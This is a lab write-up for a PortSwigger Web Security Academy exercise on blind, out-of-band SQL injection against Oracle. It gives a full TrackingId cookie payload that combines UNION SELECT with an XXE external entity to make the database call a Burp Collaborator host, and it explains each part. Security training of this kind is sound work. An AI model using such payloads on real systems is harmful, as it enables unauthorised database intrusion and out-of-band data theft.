# Blind SQL Injection with Out-of-Band Interaction


**Platform:** PortSwigger Web Security Academy

**Difficulty:** Practitioner

**Type:** Blind SQL Injection / OOB (Out-of-Band)

**Database:** Oracle


**Status:** Solved


## 🎯 Objective



Exploit the `TrackingId` cookie to trigger a **DNS lookup to Burp Collaborator**.



## 🧠 Core Idea



The SQL query runs asynchronously, so the application response does not reveal the result.



Instead, use an **out-of-band interaction**:



```text

SQL Injection

     ↓

Oracle XML processing

     ↓

External Entity (XXE)

     ↓

DNS/HTTP request

     ↓

Burp Collaborator

     ↓

Interaction detected

```



## 1. Burp Collaborator



Open **Burp Collaborator Client** and generate/copy a Collaborator payload.



Use:



**Right-click → Insert Collaborator payload**



The placeholder:



```text

BURP-COLLABORATOR-SUBDOMAIN

```



is replaced with the generated Collaborator domain.



## 2. SQL Injection Payload



Use:



```http

TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root
+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--


```



Replace the Collaborator placeholder with the generated payload.



## 3. Payload Breakdown



### `UNION SELECT`



Adds a second query to the original SQL statement:



```sql

UNION SELECT ...

```



### `EXTRACTVALUE()`



Oracle XML function used to process the XML:



```sql

EXTRACTVALUE(xmltype(...), '/l')

```



### `XMLTYPE()`



Converts the supplied XML string into an Oracle XML value.



### External Entity



The XML contains:



```xml

<!DOCTYPE root [

  <!ENTITY % remote SYSTEM "http://COLLABORATOR-DOMAIN/">

  %remote;

]>

```



The external entity causes the database to request the Collaborator domain.



## 4. Verify the Interaction



Send the modified request from **Burp Repeater**.



Then open **Burp Collaborator Client** and select:




```text

Poll now

```



A DNS interaction from the lab confirms that the payload was executed.



## 🔑 Key Takeaways



```text

OOB SQL Injection

       ↓

No useful response

       ↓

Trigger external interaction

       ↓

Monitor Collaborator

       ↓

DNS interaction = SQLi confirmed

```



### Important Concept



**Out-of-Band SQL Injection** uses an external channel to confirm or retrieve information when the normal HTTP 
response provides no useful feedback.



### References



* [PortSwigger — Blind SQL injection with out-of-band interaction](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band)
* [PortSwigger — SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
